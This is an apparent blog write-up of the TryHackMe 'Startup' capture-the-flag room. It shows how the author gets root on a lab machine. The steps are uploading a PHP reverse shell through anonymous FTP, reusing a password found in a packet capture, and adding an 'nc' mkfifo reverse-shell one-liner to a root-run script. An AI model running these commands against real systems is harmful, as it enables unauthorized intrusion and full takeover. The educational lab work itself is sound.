---
title: Tryhackme Startup Walkthrough
date: 2024-02-14 04:40:00 +/-0530
categories: [tryhackme,linux]
tags: [tryhackme,linux,pentesting,ftp]
img_path: /assets/img/tryhackme/startup/
---

Hi ones and zeroes this is a writeup about me solving the [startup](https://tryhackme.com/room/startup) room by tryhackme. Actually its more of a brain dump of what I did ? and why I did ? Room's description says its a pentesting scenerio, its difficulty is easy. So here we go:

### Scanning

First of all we start the challenge with scanning the target machine.
#### Initial network scan
```zsh
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.23.42 --ulimit 10000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
Open 10.10.23.42:21
Open 10.10.23.42:22
Open 10.10.23.42:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 12:19 IST
Initiating Ping Scan at 12:19
Scanning 10.10.23.42 [2 ports]
Completed Ping Scan at 12:19, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:19
Completed Parallel DNS resolution of 1 host. at 12:19, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:19
Scanning 10.10.23.42 [3 ports]
Discovered open port 80/tcp on 10.10.23.42
Discovered open port 22/tcp on 10.10.23.42
Discovered open port 21/tcp on 10.10.23.42
Completed Connect Scan at 12:19, 0.19s elapsed (3 total ports)
Nmap scan report for 10.10.23.42
Host is up, received syn-ack (0.17s latency).
Scanned at 2024-02-09 12:19:16 IST for 0s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```
This nmap scan tells us that there are three ports that are open on this machine, port 21, 22, and 80 using services ftp, ssh, http.

### Web App Enumeration
I personally like to enumerate the web app first. So I took a look at the webpage.

![App in construction](webapp01.png)

#### Directory enumeration
There is nothing much on the `/` dir, so I thought of doing directory enumeration. I personally like to use gobuster since it runs really fast, though you can use whatever tool you would like to enumerate directories.
```zsh
┌──(kali㉿kali)-[~/THM]
└─$ gobuster dir -t 100 --url http://10.10.23.42/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -o gobuster-results --timeout 20s
```
> - you can change number of threads `-t 100` according to your system hardware.
> - I set 20s timeout `--timeout 20s` as the default 10s was giving timeout errors.
{: .prompt-info }

### FTP Enumeration
As gobuster was trying to find directories I thought of enumerating ftp a little in another tab.
I tried anonymous login and it worked smoothly. So the directory I got connected to via ftp had three files namely important.jpg, notice.txt, and a hidden file.
I downloaded all of them one by one with `get <filename>` command.
```zsh
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.23.42 21
Connected to 10.10.23.42.
220 (vsFTPd 3.0.3)
Name (10.10.23.42:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||27118|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get important.jpg
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||29328|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |**************************************************************************************************************************|   245 KiB  359.14 KiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (290.12 KiB/s)
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||26198|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |**************************************************************************************************************************|   208       37.58 KiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (1.22 KiB/s)
ftp> exit
221 Goodbye.
```
After downloading the files
First I saw the jpg
![Amongus meme](important.jpg)
_important.jpg_
After that I took a look at the notice.txt which said
```zsh
┌──(kali㉿kali)-[~/THM]
└─$ cat notice.txt                            
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
Thought Maya could be a username on the system.
> Spoiler! There is no user as Maya
{: .prompt-warning }

The contents of `notice.txt` shows that `important.jpg` was a joke but still just to be sure I tried running `strings` command on image file and I found nothing of my interest there. I also tried some steg on it, nothing worked.

#### Unfolding the vulnerability
At this point of time I checked at the gobuster output
```zsh
┌──(kali㉿kali)-[~/THM]
└─$ gobuster dir -t 100 --url http://10.10.23.42/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -o gobuster-results --timeout 20s
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.23.42/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php
[+] Timeout:                 20s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 808]
/files                (Status: 301) [Size: 310] [--> http://10.10.23.42/files/]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
Progress: 262992 / 262995 (100.00%)
===============================================================
Finished
===============================================================
```
It shows an interesting directory named `/files`, so I accessed it using browser and woah!!
It is the same directory which I can access through ftp.
![files dir](webapp02.png)

It rang a bell in my mind that maybe I can upload a file from ftp and access it through browser. So I started testing. I used basic php reverse shell and changed the ip address to my tunnel ip address `tun0` and simply started trying to put it on the target machine.
```zsh
┌──(kali㉿kali)-[~/transfer]
└─$ ftp 10.10.23.42 21
Connected to 10.10.23.42.
220 (vsFTPd 3.0.3)
Name (10.10.23.42:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put thm-rev.php 
local: thm-rev.php remote: thm-rev.php
229 Entering Extended Passive Mode (|||59487|)
553 Could not create file.
ftp> put thm-rev.php
local: thm-rev.php remote: thm-rev.php
229 Entering Extended Passive Mode (|||50780|)
553 Could not create file.
ftp> put thm-rev.php thm.php
local: thm-rev.php remote: thm.php
229 Entering Extended Passive Mode (|||8509|)
553 Could not create file.
ftp> exit
221 Goodbye.
```
I tried but it threw an error saying `553 Could not create file.` So I looked again at the permissions of the files in the directory I was in and I saw that th directory there which was named `ftp` had full permissions `drwxrwxrwx`

So I moved into `ftp` directory and then tried putting a simple txt file to test. Then I accessed it through browser it was working, no problem. Then I uploaded my php reverse shell `thm-rev.php` in the ftp directory.
```zsh
┌──(kali㉿kali)-[~/transfer]
└─$ ftp 10.10.23.42 21
Connected to 10.10.23.42.
220 (vsFTPd 3.0.3)
Name (10.10.23.42:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ftp
250 Directory successfully changed.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||58257|)
150 Ok to send data.
100% |*************************************|     5       63.41 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes sent in 00:00 (0.01 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||48529|)
150 Here comes the directory listing.
-rwxrwxr-x    1 112      118             5 Feb 09 07:39 test.txt
226 Directory send OK.
ftp> put thm-rev.php 
local: thm-rev.php remote: thm-rev.php
229 Entering Extended Passive Mode (|||43125|)
150 Ok to send data.
100% |*************************************|  5494       45.16 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (14.43 KiB/s)
ftp> exit
221 Goodbye.
```
### Exploitation
Now that the php reverse shell is uploaded to the server we just need to access the file from a web browser to execute it & catch the reverse shell using a listener.

Started the listener using netcat and fired the reverse shell by accessing `http://10.10.23.42/files/ftp/thm-rev.php`
```zsh
┌──(kali㉿kali)-[~/transfer]
└─$ nc -lnvp 4444    
listening on [any] 4444 ...
connect to [10.X.X.X] from (UNKNOWN) [10.10.23.42] 54304
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:53:14 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
And That's how I got the my sweet reverse shell. Then I quickly listed the dirs in current dir.
![root dir listing](ftp_root_dir.png)
I quickly saw the what's inside the `recipe.txt` and found the first flag.
```zsh
$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```
> Flag 1 is love
{: .prompt-info }

### Privilege Escalation
Now I saw that there is another directory `incidents` whose owner is `www-data`. So I looked into it and found a file named `suspicious.pcapng`

Since I couldn't run any gui I thought of running `cat` on it.
```zsh
$ cd incidents
$ ls
suspicious.pcapng
$ cat suspicious.pcapng
```
![suspicious.pcapng file output](suspicious_output.png)
Here I found an amazing piece of information a password `c4ntg3t3n0ughsp1c3`
I also remembered the name I found earlier and tried the password for that user.
> Dumb me who didn't look into home dir because there is no user other than lennie in the home dir
{: .prompt-warning }

Then 'cause I couldn't got any other a/c login I thought of opening the file with wireshark to better understand it. So I went ahead and downloaded the `/suspicious.pcapng`
```zsh
sudo: 3 incorrect password attempts
www-data@startup:/incidents$ python3 -m http.server 8080
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.x.x.x - - [09/Feb/2024 08:18:01] "GET /suspicious.pcapng HTTP/1.1" 200 -
```
> You can use python simple http server to spun up a server quickly to access the dir through browser.
{: .prompt-tip}

I downloaded the pcapng file but before opening it I thought to check that password for the user lennie
```zsh
┌──(kali㉿kali)-[~/transfer]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.X.X.X] from (UNKNOWN) [10.10.23.42] 54316
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:24:34 up  1:44,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
>If target system have python you can use `python3 -c 'import pty;pty.spawn("/bin/bash")'` to get a tty shell
{: .prompt-tip }
```zsh
www-data@startup:/$ cd home
cd home
www-data@startup:/home$ ls
ls
lennie
www-data@startup:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
drwxr-xr-x 25 root   root   4096 Feb  9 06:41 ..
drwx------  4 lennie lennie 4096 Nov 12  2020 lennie
www-data@startup:/home$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/home$ cd lennie
cd lennie
lennie@startup:~$ ls
ls
Documents  scripts  user.txt
lennie@startup:~$ cat user.txt
cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0xxx}
lennie@startup:~$ 
```
This time it WORKED
> Got the user flag THM{03ce3d619b80ccbfb3b7fc81e46c0xxx}
{: .prompt-info }

#### Getting the root access
I looked at contents of home directory of lennie. `scripts` dir looks rather interesting as it is owned by root. so I went ahead and looked at the contents of scripts dir.
```zsh
lennie@startup:~$ ls -la
ls -la
total 20
drwx------ 4 lennie lennie 4096 Nov 12  2020 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
lennie@startup:~$ cd scripts
cd scripts
lennie@startup:~/scripts$ ls -la
ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Feb  9 08:36 startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt
cat startup_list.txt

lennie@startup:~/scripts$ cat planner.sh
cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
Then I looked at what variables I can change in this script like the LIST variable and `print.sh` script. I initially assumed that `planner.sh` script runs whenever a user logs in 'cause it echo contents of `$LIST` into startup named txt file.

so I added a reverse shell in `print.sh` and started a listener on my machine. (`nc mkfifo` from [revshells.com](https://revshells.com))
```zsh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.X.X.X 4444 >/tmp/f
```
```zsh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.X.X.X] from (UNKNOWN) [10.10.23.42] 40910
bash: cannot set terminal process group (2196): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# ls
ls
root.txt
root@startup:~# cat root.txt
cat root.txt
THM{f963aaa6a430f210222158ae15c3dxxx}
```
> Got root flag also THM{f963aaa6a430f210222158ae15c3dxxx}
{: .prompt-info }

And thats how this box got rooted.
Until next time keep hacking
Signing off <3.

> 10.X.X.X is my ip
> 10.10.23.42 is target machine
